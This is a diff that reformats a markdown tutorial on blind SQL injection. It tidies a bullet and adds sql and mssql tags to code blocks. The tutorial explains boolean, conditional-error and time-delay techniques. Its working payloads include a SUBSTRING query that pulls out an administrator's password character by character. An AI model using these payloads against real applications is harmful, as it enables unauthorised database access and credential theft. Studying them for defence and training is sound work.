@@ -1,7 +1,7 @@
 # Blind SQL Injection:
 
 ## D. Blind SQL injection, `where the results of a query you can't see in the application's HTTP responses.`
-- - Basically, the attacker doesn't see the direct results of their injected queries rather the attacker relies on the behavior of the site.
+- Basically, the attacker doesn't see the direct results of their injected queries rather the attacker relies on the behavior of the site.
 - Trial and error, the attacker continues to extract data by asking a series of true or false questions, gradually revealing sensitive information such as database structure, table names, or even specific data records.
 
 # Type 1: Boolean-Based Blind SQL Injection
@@ -20,13 +20,13 @@
 - ![image](https://github.com/user-attachments/assets/fac6eae1-c2b4-479f-a395-ff2cd0c8dcdf)
 
 ### Example:
-```
+```sql
 …xyz' AND '1'='1     The first of these values causes the query to return results, because the injected AND '1'='1 condition is true. As a result, the "Welcome back" message is displayed.
 …xyz' AND '1'='2     The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
 ```
 
 - For example, suppose there is a table called Users with the columns Username and Password, and a user called Administrator. You can determine the password for this user by sending a series of inputs to test the password one character at a time.
-```
+```sql
 To do this, start with the following input:
 
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
@@ -42,7 +42,7 @@ We can continue this process to systematically determine the full password for t
 ```
 
 _Example_
-```
+```sql
 Injected Payload:
 Suppose the application constructs a query like this: SELECT * FROM items WHERE item_name = 'input_value'.
 An attacker could input anything' OR (SELECT 'a' FROM users LIMIT 1)='a' --.
@@ -67,7 +67,7 @@ Therefore, the entire WHERE clause evaluates to TRUE, potentially bypassing the 
 
 ## Exploiting blind SQL injection by triggering conditional errors:
 - To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
-```
+```sql
 xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
 xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
 These inputs use the CASE keyword to test a condition and return a different expression depending on whether the expression is true:
@@ -95,7 +95,7 @@ With the second input, it evaluates to 1/0, which causes a divide-by-zero error.
 
 ## Exploiting blind SQL injection by triggering time delays:
 - SQL queries are normally processed synchronously by the application, `delaying the execution of a SQL query also delays the HTTP response.`
-```
+```mssql
 For Microsoft SQL Server,:
 
 '; IF (1=2) WAITFOR DELAY '0:0:10'-- # The first of these inputs does not trigger a delay, because the condition 1=2 is false.
